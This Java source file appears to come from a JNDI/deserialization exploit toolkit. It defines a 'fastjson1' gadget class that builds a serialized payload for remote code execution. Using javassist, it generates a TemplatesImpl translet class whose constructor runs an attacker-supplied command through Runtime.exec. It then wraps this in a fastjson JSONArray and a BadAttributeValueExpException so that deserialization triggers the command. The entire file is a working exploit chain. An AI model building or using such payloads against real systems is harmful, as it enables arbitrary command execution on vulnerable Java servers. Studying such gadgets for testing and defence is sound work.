package com.qi4l.jndi.gadgets;

import com.alibaba.fastjson.JSONArray;
import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;

import static com.qi4l.jndi.Starter.JYsoMode;

public class fastjson1 implements ObjectPayload<Object> {
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {



        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = null;

        try {
            clazz = pool.makeClass("a");
            CtClass superClass = pool.get(AbstractTranslet.class.getName());
            clazz.setSuperclass(superClass);
            CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
            constructor.setBody("Runtime.getRuntime().exec(\""+param[0]+"\");");
            clazz.addConstructor(constructor);
            clazz.getClassFile().setMajorVersion(49);
        }catch (Exception e){// 多次执行，更改构造函数内容
            clazz = pool.get("a");
            clazz.defrost();
            clazz.getClassFile().setMajorVersion(49);
            CtClass superClass = pool.get(AbstractTranslet.class.getName());
            clazz.setSuperclass(superClass);
            CtConstructor defaultConstructor = clazz.getDeclaredConstructor(new CtClass[0]);
            defaultConstructor.setBody("Runtime.getRuntime().exec(\""+param[0]+"\");");
//            System.out.println(param[0]);
            clazz.toClass();
        }


        final Object templates;
        if (JYsoMode.contains("yso")) {
            templates = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            templates = Gadgets.createTemplatesImpl(type, param);
        }


        setValue(templates, "_bytecodes", new byte[][]{clazz.toBytecode()});
        setValue(templates, "_name", "1");
        setValue(templates, "_tfactory", null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setValue(bd,"val",jsonArray);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(templates,bd);

        return hashMap;
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

}
